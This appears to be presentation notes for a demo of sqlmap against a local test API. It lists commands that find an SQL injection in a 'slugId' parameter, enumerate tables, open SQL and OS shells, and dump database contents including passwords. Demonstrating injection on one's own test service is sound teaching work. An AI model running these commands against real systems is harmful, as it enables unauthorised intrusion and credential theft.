# Installation

https://github.com/sqlmapproject/sqlmap/wiki/Download-and-update


# Usage 

## Exploratory way 
```sh
py sqlmap.py -r GetSlugIdRequest.txt -p slugId # will test only slugId param
```


## Explicit way
```sh
py sqlmap.py -u http://localhost:5003/Test/GetId?slugId=a&version=1 -p slugId
```


## Commands used during presentation

```sh

Cd C:\sqlmap\sqlmapproject-sqlmap-1.6.8
py sqlmap.py -u 'http://localhost:5003/Test/GetId?slugId=a’ # AHA we have an injection! 
# Show the injection in the swagger (copy paste the output).

py sqlmap.py -u 'http://localhost:5003/Test/GetId?slugId=a’ --is-dba # do we have a DBA? 
py sqlmap.py -u 'http://localhost:5003/Test/GetId?slugId=a’ -–tables # what tables do we have in the database 
py sqlmap.py -u 'http://localhost:5003/Test/GetId?slugId=a’ --sql-shell # => select * from Apollo21.PackageDependencies 
py sqlmap.py -u 'http://localhost:5003/Test/GetId?slugId=a’ --os-shell # maybe os access? 
py sqlmap.py -u 'http://localhost:5003/Test/GetId?slugId=a’ --dump --fresh-queries # ((i want to search these data offline). Nice csv.) Passwords

```